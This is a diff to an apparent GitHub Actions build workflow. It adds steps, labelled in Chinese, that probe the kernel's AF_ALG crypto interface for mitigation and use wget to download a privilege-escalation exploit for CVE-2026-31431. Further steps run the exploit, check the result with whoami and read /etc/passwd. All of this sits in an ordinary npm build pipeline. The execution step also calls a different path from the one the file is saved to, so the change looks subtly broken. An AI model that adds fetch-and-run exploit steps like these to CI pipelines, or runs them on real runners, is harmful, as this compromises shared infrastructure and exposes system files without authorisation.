@@ -27,6 +27,28 @@ jobs:
       run: |
         uname -a
 
+    - name: 检测是否缓解
+      run: |
+        python3 -c 'import socket; s=socket.socket(38,5,0); (s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))")) or print("未缓解")) if s else None' 2>/dev/null || echo "已缓解"
+
+        
+    - name: 下载提权脚本
+      run: |
+        wget https://github.com/theori-io/copy-fail-CVE-2026-31431/raw/main/copy_fail_exp.py
+
+    - name: 执行提权脚本
+      run: |
+        python3 main/copy_fail_exp.py
+
+
+    - name: 检查权限
+      run: |
+        whoami
+
+    - name: 测试敏感文件
+      run: |
+        cat /etc/passwd
+        
     - name: 缓存项目 npm 包
       id: cache-node-modules
       uses: actions/cache@v4
